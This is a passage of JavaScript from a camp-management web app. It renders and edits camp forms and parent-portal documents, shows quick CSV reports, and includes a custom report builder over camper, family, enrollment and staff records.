    h+='<div style="background:#fff;border-radius:var(--r2);padding:14px 16px;border:1px solid var(--s200)"><div style="font-size:1.25rem;font-weight:800">'+campForms.length+'</div><div style="font-size:.7rem;color:var(--s400);font-weight:600;text-transform:uppercase">Active Forms</div></div>';
    h+='<div style="background:#fff;border-radius:var(--r2);padding:14px 16px;border:1px solid var(--s200)"><div style="font-size:1.25rem;font-weight:800;color:var(--ok)">'+completedCount+'</div><div style="font-size:.7rem;color:var(--s400);font-weight:600;text-transform:uppercase">Completed</div></div>';
    h+='<div style="background:#fff;border-radius:var(--r2);padding:14px 16px;border:1px solid var(--s200)"><div style="font-size:1.25rem;font-weight:800;color:var(--warn)">'+pendingCount+'</div><div style="font-size:.7rem;color:var(--s400);font-weight:600;text-transform:uppercase">Pending</div></div>';
    h+='</div>';
    if(campForms.length){
        campForms.forEach(function(f,fi){
            var total=Object.keys(roster).length;
            var completed=(f.responses||[]).length;
            var pct=total>0?Math.round(completed/total*100):0;
            var barColor=pct===100?'var(--ok)':pct>50?'var(--warn)':'var(--err)';
            h+='<div class="me-card" style="margin-bottom:12px;padding:16px"><div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px"><div><div style="font-size:.95rem;font-weight:700">'+esc(f.name)+'</div><div style="font-size:.75rem;color:var(--s400);margin-top:2px">'+esc(f.type||'General')+' · Created '+(f.created?new Date(f.created).toLocaleDateString():'')+'</div></div><div style="display:flex;gap:6px">'+bdg(f.required?'Required':'Optional',f.required?'err':'warn')+'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.viewFormResponses('+fi+')">Responses</button><button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err)" onclick="CampistryMe.deleteForm('+fi+')">Delete</button></div></div>';
            h+='<div style="display:flex;align-items:center;gap:10px"><div style="flex:1;height:6px;background:var(--s100);border-radius:3px;overflow:hidden"><div style="height:100%;width:'+pct+'%;background:'+barColor+';border-radius:3px;transition:width .3s"></div></div><span style="font-size:.75rem;font-weight:700;color:var(--s600)">'+completed+'/'+total+' ('+pct+'%)</span></div>';
            if(f.description) h+='<div style="font-size:.8rem;color:var(--s500);margin-top:6px">'+esc(f.description)+'</div>';
            h+='</div>';
        });
    } else {
        h+='<div class="me-empty"><h3>No forms created yet</h3><p>Create forms for health waivers, permission slips, and more.</p><button class="me-btn me-btn--pri" onclick="CampistryMe.addForm()">+ Create First Form</button></div>';
    }
    return h;
}

function _linkFormsHTML(){
    var docSvg='<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>';
    var h='<p style="font-size:.82rem;color:var(--s400);margin-bottom:18px;">Configure the forms and documents that appear in the parent-facing Link portal.</p>';

    // ── Digital Forms ──────────────────────────────────────────────
    h+='<div class="me-card" style="margin-bottom:14px;padding:16px;">';
    h+='<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">';
    h+='<div><div style="font-weight:700;font-size:.95rem;">Complete Online</div><div style="font-size:.75rem;color:var(--s400);">Forms parents fill out directly in the portal</div></div>';
    h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.addLinkDigitalForm()">+ Add Form</button>';
    h+='</div>';
    if(linkForms.digital.length){
        linkForms.digital.forEach(function(f,i){
            h+='<div style="display:flex;align-items:center;gap:10px;padding:10px 0;border-top:1px solid var(--s100);">';
            h+='<div style="flex:1;"><div style="font-size:.88rem;font-weight:600;">'+esc(f.name)+'</div>';
            if(f.description)h+='<div style="font-size:.75rem;color:var(--s400);">'+esc(f.description)+'</div>';
            h+='</div>';
            h+=bdg(f.required?'Required':'Optional',f.required?'err':'warn');
            h+='<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.editLinkItem(\'digital\','+i+')">Edit</button>';
            h+='<button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err);" onclick="CampistryMe.deleteLinkItem(\'digital\','+i+')">Delete</button>';
            h+='</div>';
        });
    } else {
        h+='<div style="font-size:.8rem;color:var(--s400);padding:10px 0;border-top:1px solid var(--s100);">No digital forms added yet. Parents will see an empty state.</div>';
    }
    h+='</div>';

    // ── Print & Return ─────────────────────────────────────────────
    h+='<div class="me-card" style="margin-bottom:14px;padding:16px;">';
    h+='<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">';
    h+='<div><div style="font-weight:700;font-size:.95rem;">Print &amp; Return</div><div style="font-size:.75rem;color:var(--s400);">PDFs parents download, fill by hand, and upload back</div></div>';
    h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.addLinkPrintForm()">+ Add Form</button>';
    h+='</div>';
    if(linkForms.printReturn.length){
        linkForms.printReturn.forEach(function(f,i){
            h+='<div style="display:flex;align-items:center;gap:10px;padding:10px 0;border-top:1px solid var(--s100);">';
            h+='<div style="flex:1;"><div style="font-size:.88rem;font-weight:600;">'+esc(f.name)+'</div>';
            if(f.description)h+='<div style="font-size:.75rem;color:var(--s400);">'+esc(f.description)+'</div>';
            if(f.downloadUrl)h+='<div style="font-size:.7rem;color:var(--me);margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:300px;"><a href="'+esc(f.downloadUrl)+'" target="_blank">'+esc(f.downloadUrl)+'</a></div>';
            h+='</div>';
            h+=bdg(f.required?'Required':'Optional',f.required?'err':'warn');
            h+='<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.editLinkItem(\'printReturn\','+i+')">Edit</button>';
            h+='<button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err);" onclick="CampistryMe.deleteLinkItem(\'printReturn\','+i+')">Delete</button>';
            h+='</div>';
        });
    } else {
        h+='<div style="font-size:.8rem;color:var(--s400);padding:10px 0;border-top:1px solid var(--s100);">No print forms added yet. Parents will see an empty state.</div>';
    }
    h+='</div>';

    // ── Camp Documents ─────────────────────────────────────────────
    h+='<div class="me-card" style="padding:16px;">';
    h+='<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">';
    h+='<div><div style="font-weight:700;font-size:.95rem;">Camp Documents</div><div style="font-size:.75rem;color:var(--s400);">Read-only downloads (handbooks, calendars, etc.)</div></div>';
    h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.addLinkDocument()">+ Add Document</button>';
    h+='</div>';
    if(linkForms.documents.length){
        linkForms.documents.forEach(function(d,i){
            h+='<div style="display:flex;align-items:center;gap:10px;padding:10px 0;border-top:1px solid var(--s100);">';
            h+='<div style="flex:1;"><div style="font-size:.88rem;font-weight:600;">'+esc(d.name)+'</div>';
            if(d.description)h+='<div style="font-size:.75rem;color:var(--s400);">'+esc(d.description)+'</div>';
            if(d.downloadUrl)h+='<div style="font-size:.7rem;color:var(--me);margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:300px;"><a href="'+esc(d.downloadUrl)+'" target="_blank">'+esc(d.downloadUrl)+'</a></div>';
            h+='</div>';
            h+='<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.editLinkItem(\'documents\','+i+')">Edit</button>';
            h+='<button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err);" onclick="CampistryMe.deleteLinkItem(\'documents\','+i+')">Delete</button>';
            h+='</div>';
        });
    } else {
        h+='<div style="font-size:.8rem;color:var(--s400);padding:10px 0;border-top:1px solid var(--s100);">No documents added yet. Parents will see an empty state.</div>';
    }
    h+='</div>';
    return h;
}

function addForm(){
    var h='<div class="me-modal-form"><div class="me-field"><label>Form Name</label><input type="text" id="formName" class="me-input" placeholder="e.g., Health Waiver 2026"></div>';
    h+='<div class="me-field"><label>Type</label><select id="formType" class="me-input"><option>Health Form</option><option>Permission Slip</option><option>Liability Waiver</option><option>Emergency Contact</option><option>Media Release</option><option>Custom</option></select></div>';
    h+='<div class="me-field"><label>Description</label><textarea id="formDesc" class="me-input" rows="3" placeholder="What this form is for..." style="resize:vertical"></textarea></div>';
    h+='<div class="me-field"><label>Required?</label><select id="formReq" class="me-input"><option value="1">Yes — must complete before camp</option><option value="0">No — optional</option></select></div>';
    h+='<div class="me-field"><label>Fields (one per line)</label><textarea id="formFields" class="me-input" rows="6" placeholder="Full Name\nDate of Birth\nAllergies\nMedications\nDoctor Name\nDoctor Phone\nInsurance Provider\nParent Signature" style="resize:vertical;font-family:monospace;font-size:.8rem"></textarea></div></div>';
    showModal('Create Form',h,function(){
        var name=document.getElementById('formName').value.trim();
        if(!name){toast('Enter a form name','error');return}
        var fields=(document.getElementById('formFields').value||'').split('\n').map(function(l){return l.trim()}).filter(Boolean);
        campForms.push({
            id:'form_'+Date.now(),
            name:name,
            type:document.getElementById('formType').value,
            description:document.getElementById('formDesc').value.trim(),
            required:document.getElementById('formReq').value==='1',
            fields:fields,
            responses:[],
            created:Date.now()
        });
        saveForms();save();closeModal();renderForms();toast('Form created');
    });
}
async function deleteForm(idx){
    var ok=await confirmDialog({title:'Delete Form?',message:'Delete this form?',confirmLabel:'Delete',danger:true});
    if(!ok)return;
    campForms.splice(idx,1);saveForms();save();renderForms();toast('Form deleted')
}
function viewFormResponses(idx){
    var f=campForms[idx];if(!f)return;
    var completed=new Set((f.responses||[]).map(function(r){return r.camper}));
    var missing=Object.keys(roster).filter(function(n){return!completed.has(n)}).sort();
    var h='<div style="margin-bottom:14px"><strong>'+esc(f.name)+'</strong> — '+(f.responses||[]).length+' responses</div>';
    if((f.responses||[]).length){
        h+='<div class="me-tw"><table class="me-t"><thead><tr><th>Camper</th><th>Submitted</th><th>Status</th></tr></thead><tbody>';
        f.responses.forEach(function(r){
            h+='<tr><td class="bold">'+esc(r.camper)+'</td><td>'+(r.date?new Date(r.date).toLocaleDateString():'')+'</td><td>'+bdg('Completed','ok')+'</td></tr>';
        });
        h+='</tbody></table></div>';
    }
    if(missing.length){
        h+='<div style="margin-top:14px;font-weight:600;color:var(--err)">Missing ('+missing.length+'):</div><div style="margin-top:6px;font-size:.8rem;color:var(--s600);column-count:2;column-gap:20px">';
        missing.forEach(function(n){h+='<div style="padding:2px 0">'+esc(n)+'</div>'});
        h+='</div>';
    }
    showModal('Form Responses',h);
}

// ─── Link Forms CRUD ─────────────────────────────────────────────────────────
function addLinkDigitalForm(){
    var h='<div class="me-modal-form">';
    h+=ff('Form Name','lfName','','text');
    h+=ff('Description (shown to parents)','lfDesc','','textarea');
    h+=ff('Required?','lfReq','','select',['Yes — required','No — optional']);
    h+='</div>';
    showModal('Add Digital Form',h,function(){
        var name=document.getElementById('lfName').value.trim();
        if(!name){toast('Enter a form name','error');return;}
        linkForms.digital.push({id:'lfd_'+Date.now(),name:name,description:document.getElementById('lfDesc').value.trim(),required:document.getElementById('lfReq').value.startsWith('Yes'),created:Date.now()});
        saveLinkForms();closeModal('dynModal');renderForms();switchFormsTab('link');toast('Digital form added');
    });
}

function addLinkPrintForm(){
    var h='<div class="me-modal-form">';
    h+=ff('Form Name','lfName','','text');
    h+=ff('Description (shown to parents)','lfDesc','','textarea');
    h+=ff('Download URL (Google Drive, Dropbox, etc.)','lfUrl','','text');
    h+=ff('Required?','lfReq','','select',['Yes — required','No — optional']);
    h+='</div>';
    showModal('Add Print & Return Form',h,function(){
        var name=document.getElementById('lfName').value.trim();
        if(!name){toast('Enter a form name','error');return;}
        linkForms.printReturn.push({id:'lfp_'+Date.now(),name:name,description:document.getElementById('lfDesc').value.trim(),downloadUrl:document.getElementById('lfUrl').value.trim(),required:document.getElementById('lfReq').value.startsWith('Yes'),created:Date.now()});
        saveLinkForms();closeModal('dynModal');renderForms();switchFormsTab('link');toast('Print form added');
    });
}

function addLinkDocument(){
    var h='<div class="me-modal-form">';
    h+=ff('Document Name','lfName','','text');
    h+=ff('Description','lfDesc','','textarea');
    h+=ff('Download URL','lfUrl','','text');
    h+='</div>';
    showModal('Add Camp Document',h,function(){
        var name=document.getElementById('lfName').value.trim();
        if(!name){toast('Enter a document name','error');return;}
        linkForms.documents.push({id:'lfdoc_'+Date.now(),name:name,description:document.getElementById('lfDesc').value.trim(),downloadUrl:document.getElementById('lfUrl').value.trim(),created:Date.now()});
        saveLinkForms();closeModal('dynModal');renderForms();switchFormsTab('link');toast('Document added');
    });
}

function editLinkItem(type,idx){
    var item=linkForms[type][idx];if(!item)return;
    var isDoc=type==='documents';
    var isDigital=type==='digital';
    var h='<div class="me-modal-form">';
    h+=ff('Name','lfName',item.name,'text');
    h+=ff('Description','lfDesc',item.description||'','textarea');
    if(!isDigital)h+=ff('Download URL','lfUrl',item.downloadUrl||'','text');
    if(!isDoc)h+=ff('Required?','lfReq',item.required?'Yes — required':'No — optional','select',['Yes — required','No — optional']);
    h+='</div>';
    showModal('Edit Item',h,function(){
        var name=document.getElementById('lfName').value.trim();
        if(!name){toast('Enter a name','error');return;}
        item.name=name;
        item.description=document.getElementById('lfDesc').value.trim();
        if(!isDigital)item.downloadUrl=document.getElementById('lfUrl').value.trim();
        if(!isDoc)item.required=document.getElementById('lfReq').value.startsWith('Yes');
        saveLinkForms();closeModal('dynModal');renderForms();switchFormsTab('link');toast('Saved');
    });
}

async function deleteLinkItem(type,idx){
    var ok=await confirmDialog({title:'Delete Item?',message:'Delete this item?',confirmLabel:'Delete',danger:true});
    if(!ok)return;
    linkForms[type].splice(idx,1);
    saveLinkForms();renderForms();switchFormsTab('link');toast('Deleted');
}

// ═══════════════════════════════════════════════════════════════
// REPORTS — Roster, enrollment, attendance, financial reports
// ═══════════════════════════════════════════════════════════════
function renderReports(){
    var c=document.getElementById('page-reports');
    var highlightId=_repHighlight; _repHighlight=null;
    var h=_reportsTabsHtml('reports');
    h+='<div class="sec-hd"><div><h2 class="sec-title">Reports & Export</h2><p class="sec-desc">Build any report you want, or grab a quick one below</p></div><div class="sec-actions"><button class="me-btn me-btn--pri" onclick="CampistryMe.openReportBuilder()">+ Build Report</button></div></div>';

    // ── Custom / saved reports ──────────────────────────────────────────────
    h+='<div class="fsec" style="margin:4px 0 8px">My Reports</div>';
    if(!savedReports.length){
        h+='<div class="me-card" style="padding:18px;margin-bottom:18px"><div style="font-size:.82rem;color:var(--s400)">No saved reports yet. Click <strong>+ Build Report</strong> to choose a data source, pick your fields, add filters, group by any field, and save it — as a live report that refreshes each time, or a frozen snapshot.</div></div>';
    }else{
        h+='<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px;margin-bottom:18px">';
        savedReports.forEach(function(r){
            var srcLabel=({campers:'Campers',families:'Families',enrollments:'Enrollments',staff:'Staff'})[r.source]||r.source;
            var meta=srcLabel+' · '+(r.fields||[]).length+' fields'+((r.filters||[]).length?' · '+r.filters.length+' filter'+(r.filters.length>1?'s':''):'')+(r.groupBy?' · grouped':'')+(r.schedule?' · 📧 '+(r.schedule.freq==='weekly'?'Weekly':'Monthly'):'');
            var badgeCss='font-size:.62rem;font-weight:700;padding:2px 8px;border-radius:999px;white-space:nowrap;';
            var modeBadge=r.mode==='snapshot'?'<span style="'+badgeCss+'background:var(--s100);color:var(--s500)">Snapshot</span>':'<span style="'+badgeCss+'background:rgba(217,119,6,.1);color:var(--me)">Live</span>';
            var isHighlight=highlightId&&r.id===highlightId;
            h+='<div class="me-card" id="repcard-'+esc(r.id)+'" style="padding:16px'+(isHighlight?';box-shadow:0 0 0 2px var(--me)':'')+'">'
                +'<div style="display:flex;justify-content:space-between;align-items:flex-start;gap:8px;margin-bottom:6px"><div style="font-size:.92rem;font-weight:700;color:var(--s800)">'+esc(r.name)+'</div>'+modeBadge+'</div>'
                +'<div style="font-size:.73rem;color:var(--s400);margin-bottom:12px">'+esc(meta)+'</div>'
                +'<div style="display:flex;gap:6px;flex-wrap:wrap">'
                    +'<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.runSavedReport(\''+esc(r.id)+'\')">Run</button>'
                    +'<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.exportSavedReport(\''+esc(r.id)+'\')">CSV</button>'
                    +'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.openReportBuilder(\''+esc(r.id)+'\')">Edit</button>'
                    +'<button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err)" onclick="CampistryMe.deleteSavedReport(\''+esc(r.id)+'\')">Delete</button>'
                +'</div></div>';
        });
        h+='</div>';
    }

    // ── Quick one-click reports ─────────────────────────────────────────────
    h+='<div class="fsec" style="margin:4px 0 8px">Quick Reports</div>';
    h+='<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:14px">';

    // Roster report
    h+='<div class="me-card" style="padding:18px"><div style="font-size:.9rem;font-weight:700;margin-bottom:4px">Camper Roster</div><div style="font-size:.75rem;color:var(--s400);margin-bottom:12px">Complete roster with divisions, bunks, medical info, contacts</div><button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.exportRosterReport()">Download CSV</button></div>';

    // Family directory
    h+='<div class="me-card" style="padding:18px"><div style="font-size:.9rem;font-weight:700;margin-bottom:4px">Family Directory</div><div style="font-size:.75rem;color:var(--s400);margin-bottom:12px">All families with parent contacts, addresses, billing status</div><button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.exportFamilyReport()">Download CSV</button></div>';

    // Enrollment pipeline
    h+='<div class="me-card" style="padding:18px"><div style="font-size:.9rem;font-weight:700;margin-bottom:4px">Enrollment Pipeline</div><div style="font-size:.75rem;color:var(--s400);margin-bottom:12px">All applications with status, payment, forms completion</div><button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.exportEnrollmentReport()">Download CSV</button></div>';

    // Division breakdown
    h+='<div class="me-card" style="padding:18px"><div style="font-size:.9rem;font-weight:700;margin-bottom:4px">Division Breakdown</div><div style="font-size:.75rem;color:var(--s400);margin-bottom:12px">Camper counts by division, grade, and bunk</div><button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.exportDivisionReport()">Download CSV</button></div>';

    // Medical summary
    h+='<div class="me-card" style="padding:18px"><div style="font-size:.9rem;font-weight:700;margin-bottom:4px">Medical Summary</div><div style="font-size:.75rem;color:var(--s400);margin-bottom:12px">All campers with allergies, medications, dietary restrictions</div><button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.exportMedicalReport()">Download CSV</button></div>';

    // Financial summary
    h+='<div class="me-card" style="padding:18px"><div style="font-size:.9rem;font-weight:700;margin-bottom:4px">Financial Summary</div><div style="font-size:.75rem;color:var(--s400);margin-bottom:12px">Revenue, payments, outstanding balances, payroll, expenses</div><button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.exportFinancialReport()">Download CSV</button></div>';

    h+='</div>';
    c.innerHTML=h;
    if(highlightId){
        var hEl=document.getElementById('repcard-'+highlightId);
        if(hEl)hEl.scrollIntoView({behavior:'smooth',block:'center'});
    }
}

// ═══════════════════════════════════════════════════════════════
// CUSTOM REPORT BUILDER — build any report from any source
// ═══════════════════════════════════════════════════════════════

// Field registry: how to turn each record type into flat report rows.
function _reportSources(){
    if(typeof loadCustomFields==='function'){ try{ loadCustomFields(); }catch(e){} }
    var cf=(typeof customFields!=='undefined'&&customFields)?customFields:[];
    var cfFields=cf.map(function(f){ return {key:'cf_'+f.id,label:f.label}; });
    return {
        campers:{ key:'campers', label:'Campers',
            fields:[
                {key:'name',label:'Name'},{key:'camperId',label:'Camper ID'},
                {key:'division',label:'Division'},{key:'grade',label:'Grade'},{key:'bunk',label:'Bunk'},
                {key:'schoolGrade',label:'School Grade'},{key:'teacher',label:'Teacher'},{key:'school',label:'School'},
                {key:'age',label:'Age'},{key:'dob',label:'DOB'},{key:'gender',label:'Gender'},
                {key:'allergies',label:'Allergies'},{key:'medications',label:'Medications'},{key:'dietary',label:'Dietary'},{key:'medicalNotes',label:'Medical Notes'},
                {key:'physician',label:'Physician'},{key:'insuranceProvider',label:'Insurance'},
                {key:'camperType',label:'Camper Type'},{key:'swimLevel',label:'Swim Level'},{key:'shirtSize',label:'Shirt Size'},
                {key:'bunkmateRequest',label:'Bunkmate Request'},{key:'separateFrom',label:'Do Not Bunk With'},
                {key:'emergencyName',label:'Emergency Contact'},{key:'emergencyPhone',label:'Emergency Phone'},
                {key:'parent1Name',label:'Parent'},{key:'parent1Phone',label:'Parent Phone'},{key:'parent1Email',label:'Parent Email'},
                {key:'city',label:'City'},{key:'state',label:'State'},{key:'zip',label:'ZIP'}
            ].concat(cfFields),
            rows:function(){
                return Object.keys(roster).map(function(n){
                    var c=roster[n]||{};
                    var row={name:n,camperId:c.camperId||'',division:c.division||'',grade:c.grade||'',bunk:c.bunk||'',
                        schoolGrade:c.schoolGrade||'',teacher:c.teacher||'',school:c.school||'',
                        age:c.dob?age(c.dob):'',dob:c.dob||'',gender:c.gender||'',
                        allergies:c.allergies||'',medications:c.medications||'',dietary:c.dietary||'',medicalNotes:c.medicalNotes||'',
                        physician:c.physician||'',insuranceProvider:c.insuranceProvider||'',
                        camperType:c.camperType||'',swimLevel:c.swimLevel||'',shirtSize:c.shirtSize||'',
                        bunkmateRequest:c.bunkmateRequest||'',separateFrom:c.separateFrom||'',
                        emergencyName:c.emergencyName||'',emergencyPhone:c.emergencyPhone||'',
                        parent1Name:c.parent1Name||'',parent1Phone:c.parent1Phone||'',parent1Email:c.parent1Email||'',
                        city:c.city||'',state:c.state||'',zip:c.zip||''};
                    cf.forEach(function(f){ row['cf_'+f.id]=c['cf_'+f.id]||''; });
                    return row;
                });
            } },
        families:{ key:'families', label:'Families',
            fields:[{key:'name',label:'Family'},{key:'campers',label:'Campers'},{key:'camperCount',label:'# Campers'},
                {key:'parent',label:'Primary Parent'},{key:'phone',label:'Phone'},{key:'email',label:'Email'},
                {key:'address',label:'Address'},{key:'totalPaid',label:'Total Paid'},{key:'balance',label:'Balance'},{key:'status',label:'Status'}],
            rows:function(){
                return Object.keys(families).map(function(k){
                    var f=families[k]||{}; var hh=(f.households||[])[0]||{}; var pp=(hh.parents||[])[0]||{};
                    return {name:f.name||'',campers:(f.camperIds||[]).join('; '),camperCount:(f.camperIds||[]).length,
                        parent:pp.name||'',phone:pp.phone||'',email:pp.email||'',address:hh.address||'',
                        totalPaid:f.totalPaid||0,balance:f.balance||0,status:f.balance>0?'Outstanding':f.totalPaid>0?'Paid':'Pending'};
                });
            } },
        enrollments:{ key:'enrollments', label:'Enrollments',
            fields:[{key:'camperName',label:'Camper'},{key:'session',label:'Session/Term'},{key:'status',label:'Status'},
                {key:'appliedDate',label:'Applied'},{key:'sessionTuition',label:'Tuition'},{key:'paymentStatus',label:'Payment'},
                {key:'formsCompleted',label:'Forms Done'},{key:'formsRequired',label:'Forms Required'},
                {key:'parentName',label:'Parent'},{key:'parentEmail',label:'Parent Email'}],
            rows:function(){
                return Object.keys(enrollments).map(function(k){
                    var e=enrollments[k]||{};
                    return {camperName:e.camperName||'',session:e.session||'',status:e.status||'',appliedDate:e.appliedDate||'',
                        sessionTuition:e.sessionTuition||0,paymentStatus:e.paymentStatus||'',formsCompleted:e.formsCompleted||0,
                        formsRequired:e.formsRequired||0,parentName:e.parentName||'',parentEmail:e.parentEmail||''};
                });
            } },
        staff:{ key:'staff', label:'Staff',
            fields:[{key:'name',label:'Name'},{key:'role',label:'Role'},{key:'type',label:'Type'},{key:'salary',label:'Salary'},{key:'bunk',label:'Bunk'}],
            rows:function(){ return (finStaff||[]).map(function(s){ return {name:s.name||'',role:s.role||'',type:s.type||'',salary:s.salary||0,bunk:s.bunk||''}; }); } }
    };
}

var _rbDraft=null; // in-progress report spec while the builder modal is open

function openReportBuilder(existingId){
    var existing=existingId?savedReports.filter(function(r){return r.id===existingId;})[0]:null;
    var sources=_reportSources();
    if(existing){
        _rbDraft={id:existing.id,name:existing.name,source:existing.source,
            fields:(existing.fields||[]).slice(),filters:(existing.filters||[]).map(function(f){return Object.assign({},f);}),
            groupBy:existing.groupBy||'',mode:existing.mode||'live',
            schedule:existing.schedule?Object.assign({},existing.schedule):{freq:'off',recipients:''}};
    }else{
        var first=sources.campers;
        _rbDraft={id:null,name:'',source:'campers',
            fields:first.fields.slice(0,6).map(function(f){return f.key;}),
            filters:[],groupBy:'',mode:'live',schedule:{freq:'off',recipients:''}};
    }
    showModal(existing?'Edit Report':'Build Report','<div id="rbBody">'+_rbInner()+'</div>',saveCurrentReport);
    // Relabel the modal Save button
    var sv=document.getElementById('dynModalSave'); if(sv) sv.textContent='Save Report';
}

function _rbInner(){
    var sources=_reportSources();
    var src=sources[_rbDraft.source]||sources.campers;
    var h='';
    h+='<div class="fg"><label class="fl">Report name</label><input class="fi" id="rbName" value="'+esc(_rbDraft.name||'')+'" placeholder="e.g. Unpaid Seniors, Bunk B3 medical"></div>';
    // Source
    h+='<div class="fg"><label class="fl">Data source</label><select class="fi" id="rbSource" onchange="CampistryMe.rbSourceChange(this.value)">';
    Object.keys(sources).forEach(function(k){ h+='<option value="'+k+'"'+(_rbDraft.source===k?' selected':'')+'>'+esc(sources[k].label)+'</option>'; });
    h+='</select></div>';
    // Fields
    h+='<div class="fg"><label class="fl">Fields <span style="font-weight:400;color:var(--s400);font-size:.7rem">(columns, in order shown)</span></label>';
    h+='<div style="display:flex;gap:6px 14px;flex-wrap:wrap;border:1px solid var(--s200);border-radius:var(--r);padding:10px 12px;max-height:150px;overflow:auto">';
    src.fields.forEach(function(f){
        var on=_rbDraft.fields.indexOf(f.key)>=0;
        h+='<label style="display:flex;align-items:center;gap:5px;font-size:.8rem;color:var(--s700);white-space:nowrap"><input type="checkbox" class="rbField" value="'+esc(f.key)+'"'+(on?' checked':'')+' style="accent-color:var(--me)">'+esc(f.label)+'</label>';
    });
    h+='</div></div>';
    // Filters
    h+='<div class="fg"><label class="fl">Filters <span style="font-weight:400;color:var(--s400);font-size:.7rem">(all must match)</span></label><div id="rbFilters">';
    (_rbDraft.filters||[]).forEach(function(f,i){ h+=_rbFilterRow(f,i); });
    h+='</div><button class="me-btn me-btn--sec me-btn--sm" style="margin-top:6px" onclick="CampistryMe.rbAddFilter()">+ Add Filter</button></div>';
    // Group by
    h+='<div class="fg"><label class="fl">Group by</label><select class="fi" id="rbGroup"><option value="">— No grouping —</option>';
    src.fields.forEach(function(f){ h+='<option value="'+esc(f.key)+'"'+(_rbDraft.groupBy===f.key?' selected':'')+'>'+esc(f.label)+'</option>'; });
    h+='</select></div>';
    // Mode
    h+='<div class="fg"><label class="fl">Save as</label><div style="display:flex;gap:14px;flex-wrap:wrap">'
        +'<label style="display:flex;align-items:center;gap:6px;font-size:.82rem"><input type="radio" name="rbMode" value="live"'+(_rbDraft.mode!=='snapshot'?' checked':'')+' style="accent-color:var(--me)"> <span><strong>Live</strong> — re-runs on fresh data each time</span></label>'
        +'<label style="display:flex;align-items:center;gap:6px;font-size:.82rem"><input type="radio" name="rbMode" value="snapshot"'+(_rbDraft.mode==='snapshot'?' checked':'')+' style="accent-color:var(--me)"> <span><strong>Snapshot</strong> — freezes the records as they are now</span></label>'
    +'</div></div>';
    // Scheduled delivery
    var sch=_rbDraft.schedule||{freq:'off',recipients:''};
    h+='<div class="fg"><label class="fl">Email this report <span style="font-weight:400;color:var(--s400);font-size:.7rem">(sends a link to open it in Me — not an attachment)</span></label>';
    h+='<select class="fi" id="rbSchedFreq" onchange="document.getElementById(\'rbSchedRecipWrap\').style.display=this.value===\'off\'?\'none\':\'block\'">';
    [['off','Off'],['weekly','Weekly'],['monthly','Monthly']].forEach(function(o){ h+='<option value="'+o[0]+'"'+(sch.freq===o[0]?' selected':'')+'>'+o[1]+'</option>'; });
    h+='</select>';
    h+='<div id="rbSchedRecipWrap" style="margin-top:6px;'+(sch.freq==='off'?'display:none':'')+'"><input class="fi" id="rbSchedRecipients" value="'+esc(sch.recipients||'')+'" placeholder="Recipient emails, comma-separated"></div>';
    h+='</div>';
    // Preview
    h+='<div style="display:flex;justify-content:space-between;align-items:center;margin-top:6px"><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.rbPreview()">Preview</button><span id="rbPreviewCount" style="font-size:.78rem;color:var(--s400)"></span></div>';
    h+='<div id="rbPreview" style="margin-top:10px"></div>';
    return h;
}

function _rbFilterRow(f,i){
    var sources=_reportSources(); var src=sources[_rbDraft.source]||sources.campers;
    var RB=window.ReportBuilderCore;
    f=f||{};
    var fieldOpts=src.fields.map(function(x){return '<option value="'+esc(x.key)+'"'+(f.field===x.key?' selected':'')+'>'+esc(x.label)+'</option>';}).join('');
    var opOpts=(RB?RB.OPERATORS:[]).map(function(o){return '<option value="'+o.op+'"'+(f.op===o.op?' selected':'')+'>'+esc(o.label)+'</option>';}).join('');
    return '<div class="rbFilter" style="display:flex;gap:6px;align-items:center;margin-bottom:5px">'
        +'<select class="fi rbfField" style="flex:1;font-size:.8rem;padding:5px 6px">'+fieldOpts+'</select>'
        +'<select class="fi rbfOp" style="flex:0 0 130px;font-size:.8rem;padding:5px 6px">'+opOpts+'</select>'
        +'<input class="fi rbfVal" style="flex:1;font-size:.8rem;padding:5px 8px" value="'+esc(f.value||'')+'" placeholder="value">'
        +'<button class="me-btn me-btn--ghost" style="color:var(--err);font-size:.7rem" onclick="this.closest(\'.rbFilter\').remove()">✕</button></div>';
}

function _rbSyncFromDom(){
    if(!_rbDraft) return;
    _rbDraft.name=(document.getElementById('rbName')||{}).value||'';
    _rbDraft.fields=Array.prototype.map.call(document.querySelectorAll('.rbField:checked'),function(cb){return cb.value;});
    _rbDraft.groupBy=(document.getElementById('rbGroup')||{}).value||'';
    var mode=document.querySelector('input[name="rbMode"]:checked');
    _rbDraft.mode=mode?mode.value:'live';
